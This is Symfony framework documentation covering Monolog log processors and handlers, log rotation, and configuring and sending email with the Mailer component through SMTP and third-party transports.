:class:`Symfony\\Bridge\\Monolog\\Processor\\DebugProcessor`
    Adds additional information useful for debugging like a timestamp or an
    error message to the record.

:class:`Symfony\\Bridge\\Monolog\\Processor\\TokenProcessor`
    Adds information from the current user's token to the record namely
    username, roles and whether the user is authenticated.

:class:`Symfony\\Bridge\\Monolog\\Processor\\SwitchUserTokenProcessor`
    Adds information about the user who is impersonating the logged in user,
    namely username, roles and whether the user is authenticated.

:class:`Symfony\\Bridge\\Monolog\\Processor\\WebProcessor`
    Overrides data from the request using the data inside Symfony's request
    object.

:class:`Symfony\\Bridge\\Monolog\\Processor\\RouteProcessor`
    Adds information about current route (controller, action, route parameters).

:class:`Symfony\\Bridge\\Monolog\\Processor\\ConsoleCommandProcessor`
    Adds information about the current console command.

.. seealso::

    Check out the `built-in Monolog processors`_ to learn more about how to
    create these processors.

Registering Processors per Handler
----------------------------------

You can register a processor per handler using the ``handler`` option of
the ``monolog.processor`` tag:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Logger\SessionRequestProcessor:
                tags:
                    - { name: monolog.processor, handler: main }

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:monolog="http://symfony.com/schema/dic/monolog"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/monolog
                https://symfony.com/schema/dic/monolog/monolog-1.0.xsd">

            <services>
                <service id="App\Logger\SessionRequestProcessor">
                    <tag name="monolog.processor" handler="main"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php

        // ...
        $container
            ->register(SessionRequestProcessor::class)
            ->addTag('monolog.processor', ['handler' => 'main']);

Registering Processors per Channel
----------------------------------

By default, processors are applied to all channels. Add the ``channel`` option
to the ``monolog.processor`` tag to only apply a processor for the given channel:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Logger\SessionRequestProcessor:
                tags:
                    - { name: monolog.processor, channel: 'app' }

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:monolog="http://symfony.com/schema/dic/monolog"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/monolog
                https://symfony.com/schema/dic/monolog/monolog-1.0.xsd">

            <services>
                <service id="App\Logger\SessionRequestProcessor">
                    <tag name="monolog.processor" channel="app"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php

        // ...
        $container
            ->register(SessionRequestProcessor::class)
            ->addTag('monolog.processor', ['channel' => 'app']);

.. _`Monolog`: https://github.com/Seldaek/monolog
.. _`built-in Monolog processors`: https://github.com/Seldaek/monolog/tree/main/src/Monolog/Processor
Logging
=======

Symfony comes with a minimalist `PSR-3`_ logger: :class:`Symfony\\Component\\HttpKernel\\Log\\Logger`.
In conformance with `the twelve-factor app methodology`_, it sends messages starting from the
``WARNING`` level to `stderr`_.

The minimal log level can be changed by setting the ``SHELL_VERBOSITY`` environment variable:

=========================  =================
``SHELL_VERBOSITY`` value  Minimum log level
=========================  =================
``-1``                     ``ERROR``
``1``                      ``NOTICE``
``2``                      ``INFO``
``3``                      ``DEBUG``
=========================  =================

The minimum log level, the default output and the log format can also be changed by
passing the appropriate arguments to the constructor of :class:`Symfony\\Component\\HttpKernel\\Log\\Logger`.
To do so, :ref:`override the "logger" service definition <service-psr4-loader>`.

Logging a Message
-----------------

To log a message, inject the default logger in your controller or service::

    use Psr\Log\LoggerInterface;
    // ...

    public function index(LoggerInterface $logger): Response
    {
        $logger->info('I just got the logger');
        $logger->error('An error occurred');

        // log messages can also contain placeholders, which are variable names
        // wrapped in braces whose values are passed as the second argument
        $logger->debug('User {userId} has logged in', [
            'userId' => $this->getUserId(),
        ]);

        $logger->critical('I left the oven on!', [
            // include extra "context" info in your logs
            'cause' => 'in_hurry',
        ]);

        // ...
    }

Adding placeholders to log messages is recommended because:

* It's easier to check log messages because many logging tools group log messages
  that are the same except for some variable values inside them;
* It's much easier to translate those log messages;
* It's better for security, because escaping can then be done by the
  implementation in a context-aware fashion.

The ``logger`` service has different methods for different logging levels/priorities.
See `LoggerInterface`_ for a list of all of the methods on the logger.

Monolog
-------

Symfony integrates seamlessly with `Monolog`_, the most popular PHP logging
library, to create and store log messages in a variety of different places
and trigger various actions.

For instance, using Monolog you can configure the logger to do different things based on the
*level* of a message (e.g. :doc:`send an email when an error occurs </logging/monolog_email>`).

Run this command to install the Monolog based logger before using it:

.. code-block:: terminal

    $ composer require symfony/monolog-bundle

The following sections assume that Monolog is installed.

Where Logs are Stored
---------------------

By default, log entries are written to the ``var/log/dev.log`` file when you're
in the ``dev`` environment.

In the ``prod`` environment, logs are written to `STDERR PHP stream`_, which
works best in modern containerized applications deployed to servers without
disk write permissions.

If you prefer to store production logs in a file, set the ``path`` of your
log handler(s) to the path of the file to use (e.g. ``var/log/prod.log``).

Handlers: Writing Logs to different Locations
---------------------------------------------

The logger has a stack of *handlers*, and each can be used to write the log entries
to different locations (e.g. files, database, Slack, etc).

.. tip::

    You can *also* configure logging "channels", which are like categories. Each
    channel can have its *own* handlers, which means you can store different log
    messages in different places. See :doc:`/logging/channels_handlers`.

Symfony pre-configures some basic handlers in the default ``monolog.yaml``
config files. Check these out for some real-world examples.

This example uses *two* handlers: ``stream`` (to write to a file) and ``syslog``
to write logs using the :phpfunction:`syslog` function:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/prod/monolog.yaml
        monolog:
            handlers:
                # this "file_log" key could be anything
                file_log:
                    type: stream
                    # log to var/log/(environment).log
                    path: "%kernel.logs_dir%/%kernel.environment%.log"
                    # log *all* messages (debug is lowest level)
                    level: debug

                syslog_handler:
                    type: syslog
                    # log error-level messages and higher
                    level: error

    .. code-block:: xml

        <!-- config/packages/prod/monolog.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:monolog="http://symfony.com/schema/dic/monolog"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/monolog
                https://symfony.com/schema/dic/monolog/monolog-1.0.xsd">

            <monolog:config>
                <!-- this "file_log" key could be anything -->
                <monolog:handler name="file_log"
                    type="stream"
                    path="%kernel.logs_dir%/%kernel.environment%.log"
                    level="debug"/><!-- log *all* messages (debug is lowest level) -->

                <monolog:handler name="syslog_handler"
                    type="syslog"
                    level="error"/><!-- log error-level messages and higher -->
            </monolog:config>
        </container>

    .. code-block:: php

        // config/packages/prod/monolog.php
        use Psr\Log\LogLevel;
        use Symfony\Config\MonologConfig;

        return static function (MonologConfig $monolog): void {
            // this "file_log" key could be anything
            $monolog->handler('file_log')
                ->type('stream')
                // log to var/logs/(environment).log
                ->path('%kernel.logs_dir%/%kernel.environment%.log')
                // log *all* messages (LogLevel::DEBUG is lowest level)
                ->level(LogLevel::DEBUG);

            $monolog->handler('syslog_handler')
                ->type('syslog')
                // log error-level messages and higher
                ->level(LogLevel::ERROR);
        };

This defines a *stack* of handlers and each handler is called in the order that it's
defined.

.. note::

    If you want to override the ``monolog`` configuration via another config
    file, you will need to redefine the entire ``handlers`` stack. The configuration
    from the two files cannot be merged because the order matters and a merge does
    not allow you to control the order.

.. _logging-handler-fingers_crossed:

Handlers that Modify Log Entries
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Instead of writing log files somewhere, *some* handlers are used to filter or modify
log entries before sending them to *other* handlers. One powerful, built-in handler
called ``fingers_crossed`` is used in the ``prod`` environment by default. It stores
*all* log messages during a request but *only* passes them to a second handler if
one of the messages reaches an ``action_level``. Take this example:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/prod/monolog.yaml
        monolog:
            handlers:
                filter_for_errors:
                    type: fingers_crossed
                    # if *one* log is error or higher, pass *all* to file_log
                    action_level: error
                    handler: file_log

                # now passed *all* logs, but only if one log is error or higher
                file_log:
                    type: stream
                    path: "%kernel.logs_dir%/%kernel.environment%.log"

                # still passed *all* logs, and still only logs error or higher
                syslog_handler:
                    type: syslog
                    level: error

    .. code-block:: xml

        <!-- config/packages/prod/monolog.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:monolog="http://symfony.com/schema/dic/monolog"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/monolog
                https://symfony.com/schema/dic/monolog/monolog-1.0.xsd">

            <monolog:config>
                <!-- if *one* log is error or higher, pass *all* to file_log -->
                <monolog:handler name="filter_for_errors"
                    type="fingers_crossed"
                    action-level="error"
                    handler="file_log"
                />

                <!-- now passed *all* logs, but only if one log is error or higher -->
                <monolog:handler name="file_log"
                    type="stream"
                    path="%kernel.logs_dir%/%kernel.environment%.log"
                    level="debug"
                />

                <!-- still passed *all* logs, and still only logs error or higher -->
                <monolog:handler name="syslog_handler"
                    type="syslog"
                    level="error"
                />
            </monolog:config>
        </container>

    .. code-block:: php

        // config/packages/prod/monolog.php
        use Psr\Log\LogLevel;
        use Symfony\Config\MonologConfig;

        return static function (MonologConfig $monolog): void {
            $monolog->handler('filter_for_errors')
                ->type('fingers_crossed')
                // if *one* log is error or higher, pass *all* to file_log
                ->actionLevel(LogLevel::ERROR)
                ->handler('file_log')
            ;

            // now passed *all* logs, but only if one log is error or higher
            $monolog->handler('file_log')
                ->type('stream')
                ->path('%kernel.logs_dir%/%kernel.environment%.log')
                ->level(LogLevel::DEBUG)
            ;

            // still passed *all* logs, and still only logs error or higher
            $monolog->handler('syslog_handler')
                ->type('syslog')
                ->level(LogLevel::ERROR)
            ;
        };

Now, if even one log entry has an ``LogLevel::ERROR`` level or higher, then *all* log entries
for that request are saved to a file via the ``file_log`` handler. That means that
your log file will contain *all* the details about the problematic request - making
debugging much easier!

.. tip::

    The handler named "file_log" will not be included in the stack itself as
    it is used as a nested handler of the ``fingers_crossed`` handler.

All Built-in Handlers
---------------------

Monolog comes with *many* built-in handlers for emailing logs, sending them to Loggly,
or notifying you in Slack. These are documented inside of MonologBundle itself. For
a full list, see `Monolog Configuration`_.

How to Rotate your Log Files
----------------------------

Over time, log files can grow to be *huge*, both while developing and on
production. One best-practice solution is to use a tool like the `logrotate`_
Linux command to rotate log files before they become too large.

Another option is to have Monolog rotate the files for you by using the
``rotating_file`` handler. This handler creates a new log file every day
and can also remove old files automatically. To use it, set the ``type``
option of your handler to ``rotating_file``:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/prod/monolog.yaml
        monolog:
            handlers:
                main:
                    type:  rotating_file
                    path:  '%kernel.logs_dir%/%kernel.environment%.log'
                    level: debug
                    # max number of log files to keep
                    # defaults to zero, which means infinite files
                    max_files: 10

    .. code-block:: xml

        <!-- config/packages/prod/monolog.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:monolog="http://symfony.com/schema/dic/monolog"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/monolog
                https://symfony.com/schema/dic/monolog/monolog-1.0.xsd">

            <monolog:config>
                <!-- "max-files": max number of log files to keep
                     defaults to zero, which means infinite files -->
                <monolog:handler name="main"
                    type="rotating_file"
                    path="%kernel.logs_dir%/%kernel.environment%.log"
                    level="debug"
                    max-files="10"
                />
            </monolog:config>
        </container>

    .. code-block:: php

        // config/packages/prod/monolog.php
        use Psr\Log\LogLevel;
        use Symfony\Config\MonologConfig;

        return static function (MonologConfig $monolog): void {
            $monolog->handler('main')
                ->type('rotating_file')
                ->path('%kernel.logs_dir%/%kernel.environment%.log')
                ->level(LogLevel::DEBUG)
                // max number of log files to keep
                // defaults to zero, which means infinite files
                ->maxFiles(10);
        };

Using a Logger inside a Service
-------------------------------

If your application uses :ref:`service autoconfiguration <services-autoconfigure>`,
any service whose class implements ``Psr\Log\LoggerAwareInterface`` will
receive a call to its method ``setLogger()`` with the default logger service
passed as a service.

If you want to use in your own services a pre-configured logger which uses a
specific channel (``app`` by default), you can either :ref:`autowire monolog channels <monolog-autowire-channels>`
or use the ``monolog.logger`` tag  with the ``channel`` property as explained in the
:ref:`Dependency Injection reference <dic_tags-monolog>`.

Adding extra Data to each Log (e.g. a unique request token)
-----------------------------------------------------------

Monolog also supports *processors*: functions that can dynamically add extra
information to your log entries.

See :doc:`/logging/processors` for details.

Handling Logs in Long Running Processes
---------------------------------------

During long running processes, logs can be accumulated into Monolog and cause some
buffer overflow, memory increase or even non logical logs. Monolog in-memory data
can be cleared using the ``reset()`` method on a ``Monolog\Logger`` instance.
This should typically be called between every job or task that a long running process
is working through.

Learn more
----------

.. toctree::
    :maxdepth: 1

    logging/monolog_email
    logging/channels_handlers
    logging/formatter
    logging/processors
    logging/handlers
    logging/monolog_exclude_http_codes
    logging/monolog_console

.. _`the twelve-factor app methodology`: https://12factor.net/logs
.. _`PSR-3`: https://www.php-fig.org/psr/psr-3/
.. _`stderr`: https://en.wikipedia.org/wiki/Standard_streams#Standard_error_(stderr)
.. _`Monolog`: https://github.com/Seldaek/monolog
.. _`LoggerInterface`: https://github.com/php-fig/log/blob/master/src/LoggerInterface.php
.. _`logrotate`: https://github.com/logrotate/logrotate
.. _`Monolog Configuration`: https://github.com/symfony/monolog-bundle/blob/master/DependencyInjection/Configuration.php#L25
.. _`STDERR PHP stream`: https://www.php.net/manual/en/features.commandline.io-streams.php
Sending Emails with Mailer
==========================

Installation
------------

Symfony's Mailer & :doc:`Mime </components/mime>` components form a *powerful* system
for creating and sending emails - complete with support for multipart messages, Twig
integration, CSS inlining, file attachments and a lot more. Get them installed with:

.. code-block:: terminal

    $ composer require symfony/mailer

.. _mailer-transport-setup:

Transport Setup
---------------

Emails are delivered via a "transport". Out of the box, you can deliver emails
over SMTP by configuring the DSN in your ``.env`` file (the ``user``,
``pass`` and ``port`` parameters are optional):

.. code-block:: env

    # .env
    MAILER_DSN=smtp://user:pass@smtp.example.com:port

.. configuration-block::

    .. code-block:: yaml

        # config/packages/mailer.yaml
        framework:
            mailer:
                dsn: '%env(MAILER_DSN)%'

    .. code-block:: xml

        <!-- config/packages/mailer.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:mailer dsn="%env(MAILER_DSN)%"/>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/mailer.php
        use function Symfony\Component\DependencyInjection\Loader\Configurator\env;
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->mailer()->dsn(env('MAILER_DSN'));
        };

.. caution::

    If the username, password or host contain any character considered special in a
    URI (such as ``: / ? # [ ] @ ! $ & ' ( ) * + , ; =``), you must
    encode them. See `RFC 3986`_ for the full list of reserved characters or use the
    :phpfunction:`urlencode` function to encode them.

Using Built-in Transports
~~~~~~~~~~~~~~~~~~~~~~~~~

============  ========================================  ==============================================================
DSN protocol  Example                                   Description
============  ========================================  ==============================================================
smtp          ``smtp://user:pass@smtp.example.com:25``  Mailer uses an SMTP server to send emails
sendmail      ``sendmail://default``                    Mailer uses the local sendmail binary to send emails
native        ``native://default``                      Mailer uses the sendmail binary and options configured
                                                        in the ``sendmail_path`` setting of ``php.ini``. On Windows
                                                        hosts, Mailer fallbacks to ``smtp`` and ``smtp_port``
                                                        ``php.ini`` settings when ``sendmail_path`` is not configured.
============  ========================================  ==============================================================

.. caution::

    When using ``native://default``, if ``php.ini`` uses the ``sendmail -t``
    command, you won't have error reporting and ``Bcc`` headers won't be removed.
    It's highly recommended to NOT use ``native://default`` as you cannot control
    how sendmail is configured (prefer using ``sendmail://default`` if possible).

.. _mailer_3rd_party_transport:

Using a 3rd Party Transport
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Instead of using your own SMTP server or sendmail binary, you can send emails
via a third-party provider:

===================== =============================================== ===============
Service               Install with                                    Webhook support
===================== =============================================== ===============
`Amazon SES`_         ``composer require symfony/amazon-mailer``
`Azure`_              ``composer require symfony/azure-mailer``
`Brevo`_              ``composer require symfony/brevo-mailer``       yes
`Infobip`_            ``composer require symfony/infobip-mailer``
`Mailgun`_            ``composer require symfony/mailgun-mailer``     yes
`Mailjet`_            ``composer require symfony/mailjet-mailer``     yes
`MailPace`_           ``composer require symfony/mail-pace-mailer``
`MailerSend`_         ``composer require symfony/mailer-send-mailer``
`Mandrill`_           ``composer require symfony/mailchimp-mailer``
`Postmark`_           ``composer require symfony/postmark-mailer``    yes
`Resend`_             ``composer require symfony/resend-mailer``      yes
`Scaleway`_           ``composer require symfony/scaleway-mailer``
`SendGrid`_           ``composer require symfony/sendgrid-mailer``    yes
===================== =============================================== ===============

.. versionadded:: 7.1

    The Azure and Resend integrations were introduced in Symfony 7.1.

.. note::

    As a convenience, Symfony also provides support for Gmail (``composer
    require symfony/google-mailer``), but this should not be used in
    production. In development, you should probably use an :ref:`email catcher
    <mail-catcher>` instead. Note that most supported providers also offer a
    free tier.

Each library includes a :ref:`Symfony Flex recipe <symfony-flex>` that will add
a configuration example to your ``.env`` file. For example, suppose you want to
use SendGrid. First, install it:

.. code-block:: terminal

    $ composer require symfony/sendgrid-mailer

You'll now have a new line in your ``.env`` file that you can uncomment:

.. code-block:: env

    # .env
    MAILER_DSN=sendgrid://KEY@default

The ``MAILER_DSN`` isn't a *real* address: it's a convenient format that
offloads most of the configuration work to mailer. The ``sendgrid`` scheme
activates the SendGrid provider that you just installed, which knows all about
how to deliver messages via SendGrid. The *only* part you need to change is the
``KEY`` placeholder.

Each provider has different environment variables that the Mailer uses to
configure the *actual* protocol, address and authentication for delivery. Some
also have options that can be configured with query parameters at the end of the
``MAILER_DSN`` - like ``?region=`` for Amazon SES, Mailgun or Scaleway. Some providers support
sending via ``http``, ``api`` or ``smtp``. Symfony chooses the best available
transport, but you can force to use one:

.. code-block:: env

    # .env
    # force to use SMTP instead of HTTP (which is the default)
    MAILER_DSN=sendgrid+smtp://$SENDGRID_KEY@default

This table shows the full list of available DSN formats for each third
party provider:

+------------------------+---------------------------------------------------------+
| Provider               | Formats                                                 |
+========================+=========================================================+
| `Amazon SES`_          | - SMTP ``ses+smtp://USERNAME:PASSWORD@default``         |
|                        | - HTTP ``ses+https://ACCESS_KEY:SECRET_KEY@default``    |
|                        | - API ``ses+api://ACCESS_KEY:SECRET_KEY@default``       |
+------------------------+---------------------------------------------------------+
| `Azure`_               | - API ``azure+api://ACS_RESOURCE_NAME:KEY@default``     |
+------------------------+---------------------------------------------------------+
| `Brevo`_               | - SMTP ``brevo+smtp://USERNAME:PASSWORD@default``       |
|                        | - HTTP n/a                                              |
|                        | - API ``brevo+api://KEY@default``                       |
+------------------------+---------------------------------------------------------+
| `Google Gmail`_        | - SMTP ``gmail+smtp://USERNAME:APP-PASSWORD@default``   |
|                        | - HTTP n/a                                              |
|                        | - API n/a                                               |
+------------------------+---------------------------------------------------------+
| `Infobip`_             | - SMTP ``infobip+smtp://KEY@default``                   |
|                        | - HTTP n/a                                              |
|                        | - API ``infobip+api://KEY@BASE_URL``                    |
+------------------------+---------------------------------------------------------+
| `Mandrill`_            | - SMTP ``mandrill+smtp://USERNAME:PASSWORD@default``    |
|                        | - HTTP ``mandrill+https://KEY@default``                 |
|                        | - API ``mandrill+api://KEY@default``                    |
+------------------------+---------------------------------------------------------+
| `MailerSend`_          | - SMTP ``mailersend+smtp://KEY@default``                |
|                        | - HTTP n/a                                              |
|                        | - API ``mailersend+api://KEY@BASE_URL``                 |
+------------------------+---------------------------------------------------------+
| `Mailgun`_             | - SMTP ``mailgun+smtp://USERNAME:PASSWORD@default``     |
|                        | - HTTP ``mailgun+https://KEY:DOMAIN@default``           |
|                        | - API ``mailgun+api://KEY:DOMAIN@default``              |
+------------------------+---------------------------------------------------------+
| `Mailjet`_             | - SMTP ``mailjet+smtp://ACCESS_KEY:SECRET_KEY@default`` |
|                        | - HTTP n/a                                              |
|                        | - API ``mailjet+api://ACCESS_KEY:SECRET_KEY@default``   |
+------------------------+---------------------------------------------------------+
| `MailPace`_            | - SMTP ``mailpace+api://API_TOKEN@default``             |
|                        | - HTTP n/a                                              |
|                        | - API ``mailpace+api://API_TOKEN@default``              |
+------------------------+---------------------------------------------------------+
| `Postmark`_            | - SMTP ``postmark+smtp://ID@default``                   |
|                        | - HTTP n/a                                              |
|                        | - API ``postmark+api://KEY@default``                    |
+------------------------+---------------------------------------------------------+
| `Resend`_              | - SMTP ``resend+smtp://resend:API_KEY@default``         |
|                        | - HTTP n/a                                              |
|                        | - API ``resend+api://API_KEY@default``                  |
+------------------------+---------------------------------------------------------+
| `Scaleway`_            | - SMTP ``scaleway+smtp://PROJECT_ID:API_KEY@default``   |
|                        | - HTTP n/a                                              |
|                        | - API ``scaleway+api://PROJECT_ID:API_KEY@default``     |
+------------------------+---------------------------------------------------------+
| `Sendgrid`_            | - SMTP ``sendgrid+smtp://KEY@default``                  |
|                        | - HTTP n/a                                              |
|                        | - API ``sendgrid+api://KEY@default``                    |
+------------------------+---------------------------------------------------------+

.. caution::

    If your credentials contain special characters, you must URL-encode them.
    For example, the DSN ``ses+smtp://ABC1234:abc+12/345@default`` should be
    configured as ``ses+smtp://ABC1234:abc%2B12%2F345@default``

.. caution::

    If you want to use the ``ses+smtp`` transport together with :doc:`Messenger </messenger>`
    to :ref:`send messages in background <mailer-sending-messages-async>`,
    you need to add the ``ping_threshold`` parameter to your ``MAILER_DSN`` with
    a value lower than ``10``: ``ses+smtp://USERNAME:PASSWORD@default?ping_threshold=9``

.. caution::

    If you send custom headers when using the `Amazon SES`_ transport (to receive
    them later via a webhook), make sure to use the ``ses+https`` provider because
    it's the only one that supports them.

.. note::

    When using SMTP, the default timeout for sending a message before throwing an
    exception is the value defined in the `default_socket_timeout`_ PHP.ini option.

.. note::

    Besides SMTP, many 3rd party transports offer a web API to send emails.
    To do so, you have to install (additionally to the bridge)
    the HttpClient component via ``composer require symfony/http-client``.

.. note::

    To use Google Gmail, you must have a Google Account with 2-Step-Verification (2FA)
    enabled and you must use `App Password`_ to authenticate. Also note that Google
    revokes your App Passwords when you change your Google Account password and then
    you need to generate a new one.
    Using other methods (like ``XOAUTH2`` or the ``Gmail API``) are not supported currently.
    You should use Gmail for testing purposes only and use a real provider in production.

.. tip::

    If you want to override the default host for a provider (to debug an issue using
    a service like ``requestbin.com``), change ``default`` by your host:

    .. code-block:: env

        # .env
        MAILER_DSN=mailgun+https://KEY:DOMAIN@requestbin.com

    Note that the protocol is *always* HTTPs and cannot be changed.

.. note::

    The specific transports, e.g. ``mailgun+smtp`` are designed to work without any manual configuration.
    Changing the port by appending it to your DSN is not supported for any of these ``<provider>+smtp`` transports.
    If you need to change the port, use the ``smtp`` transport instead, like so:

    .. code-block:: env

        # .env
        MAILER_DSN=smtp://KEY:DOMAIN@smtp.eu.mailgun.org.com:25

.. tip::

    Some third party mailers, when using the API, support status callbacks
    via webhooks. See the :doc:`Webhook documentation </webhook>` for more
    details.

High Availability
~~~~~~~~~~~~~~~~~

Symfony's mailer supports `high availability`_ via a technique called "failover"
to ensure that emails are sent even if one mailer server fails.

A failover transport is configured with two or more transports and the
``failover`` keyword:

.. code-block:: env

    MAILER_DSN="failover(postmark+api://ID@default sendgrid+smtp://KEY@default)"

The failover-transport starts using the first transport and if it fails, it
will retry the same delivery with the next transports until one of them succeeds
(or until all of them fail).

Load Balancing
~~~~~~~~~~~~~~

Symfony's mailer supports `load balancing`_ via a technique called "round-robin"
to distribute the mailing workload across multiple transports.

A round-robin transport is configured with two or more transports and the
``roundrobin`` keyword:

.. code-block:: env

    MAILER_DSN="roundrobin(postmark+api://ID@default sendgrid+smtp://KEY@default)"

The round-robin transport starts with a *randomly* selected transport and
then switches to the next available transport for each subsequent email.

As with the failover transport, round-robin retries deliveries until
a transport succeeds (or all fail). In contrast to the failover transport,
it *spreads* the load across all its transports.

TLS Peer Verification
~~~~~~~~~~~~~~~~~~~~~

By default, SMTP transports perform TLS peer verification. This behavior is
configurable with the ``verify_peer`` option. Although it's not recommended to
disable this verification for security reasons, it can be useful while developing
the application or when using a self-signed certificate::

    $dsn = 'smtp://user:pass@smtp.example.com?verify_peer=0';

TLS Peer Fingerprint Verification
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Additional fingerprint verification can be enforced with the ``peer_fingerprint``
option. This is especially useful when a self-signed certificate is used and
disabling ``verify_peer`` is needed, but security is still desired. Fingerprint
may be specified as SHA1 or MD5 hash::

    $dsn = 'smtp://user:pass@smtp.example.com?peer_fingerprint=6A1CF3B08D175A284C30BC10DE19162307C7286E';

Disabling Automatic TLS
~~~~~~~~~~~~~~~~~~~~~~~

.. versionadded:: 7.1

    The option to disable automatic TLS was introduced in Symfony 7.1.

By default, the Mailer component will use encryption when the OpenSSL extension
is enabled and the SMTP server supports ``STARTTLS``. This behavior can be turned
off by calling ``setAutoTls(false)`` on the ``EsmtpTransport`` instance, or by
setting the ``auto_tls`` option to ``false`` in the DSN::

    $dsn = 'smtp://user:pass@10.0.0.25?auto_tls=false';

.. caution::

    It's not recommended to disable TLS while connecting to an SMTP server over
    the Internet, but it can be useful when both the application and the SMTP
    server are in a secured network, where there is no need for additional encryption.

.. note::

    This setting only works when the ``smtp://`` protocol is used.

Overriding default SMTP authenticators
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

By default, SMTP transports will try to login using all authentication methods
available on the SMTP server, one after the other. In some cases, it may be
useful to redefine the supported authentication methods to ensure that the
preferred method will be used first.

This can be done from ``EsmtpTransport`` constructor or using the
``setAuthenticators()`` method::

    use Symfony\Component\Mailer\Transport\Smtp\Auth\XOAuth2Authenticator;
    use Symfony\Component\Mailer\Transport\Smtp\EsmtpTransport;

    // Choose one of these two options:

    // Option 1: pass the authenticators to the constructor
    $transport = new EsmtpTransport(
        host: 'oauth-smtp.domain.tld',
        authenticators: [new XOAuth2Authenticator()]
    );

    // Option 2: call a method to redefine the authenticators
    $transport->setAuthenticators([new XOAuth2Authenticator()]);

Other Options
~~~~~~~~~~~~~

``command``
    Command to be executed by ``sendmail`` transport::

        $dsn = 'sendmail://default?command=/usr/sbin/sendmail%20-oi%20-t'

``local_domain``
    The domain name to use in ``HELO`` command::

        $dsn = 'smtps://smtp.example.com?local_domain=example.org'

``restart_threshold``
    The maximum number of messages to send before re-starting the transport. It
    can be used together with ``restart_threshold_sleep``::

        $dsn = 'smtps://smtp.example.com?restart_threshold=10&restart_threshold_sleep=1'

``restart_threshold_sleep``
    The number of seconds to sleep between stopping and re-starting the transport.
    It's common to combine it with ``restart_threshold``::

        $dsn = 'smtps://smtp.example.com?restart_threshold=10&restart_threshold_sleep=1'

``ping_threshold``
    The minimum number of seconds between two messages required to ping the server::

        $dsn = 'smtps://smtp.example.com?ping_threshold=200'

``max_per_second``
    The number of messages to send per second (0 to disable this limitation)::

        $dsn = 'smtps://smtp.example.com?max_per_second=2'

Custom Transport Factories
~~~~~~~~~~~~~~~~~~~~~~~~~~

If you want to support your own custom DSN (``acme://...``), you can create a
custom transport factory. To do so, create a class that implements
:class:`Symfony\\Component\\Mailer\\Transport\\TransportFactoryInterface` or, if
you prefer, extend the :class:`Symfony\\Component\\Mailer\\Transport\\AbstractTransportFactory`
class to save some boilerplate code::

    // src/Mailer/AcmeTransportFactory.php
    final class AcmeTransportFactory extends AbstractTransportFactory
    {
        public function create(Dsn $dsn): TransportInterface
        {
            // parse the given DSN, extract data/credentials from it
            // and then, create and return the transport
        }

        protected function getSupportedSchemes(): array
        {
            // this supports DSN starting with `acme://`
            return ['acme'];
        }
    }

After creating the custom transport class, register it as a service in your
application and :doc:`tag it </service_container/tags>` with the
``mailer.transport_factory`` tag.

Creating & Sending Messages
---------------------------

To send an email, get a :class:`Symfony\\Component\\Mailer\\Mailer`
instance by type-hinting :class:`Symfony\\Component\\Mailer\\MailerInterface`
and create an :class:`Symfony\\Component\\Mime\\Email` object::

    // src/Controller/MailerController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Mailer\MailerInterface;
    use Symfony\Component\Mime\Email;
    use Symfony\Component\Routing\Attribute\Route;

    class MailerController extends AbstractController
    {
        #[Route('/email')]
        public function sendEmail(MailerInterface $mailer): Response
        {
            $email = (new Email())
                ->from('hello@example.com')
                ->to('you@example.com')
                //->cc('cc@example.com')
                //->bcc('bcc@example.com')
                //->replyTo('fabien@example.com')
                //->priority(Email::PRIORITY_HIGH)
                ->subject('Time for Symfony Mailer!')
                ->text('Sending emails is fun again!')
                ->html('<p>See Twig integration for better HTML integration!</p>');

            $mailer->send($email);

            // ...
        }
    }

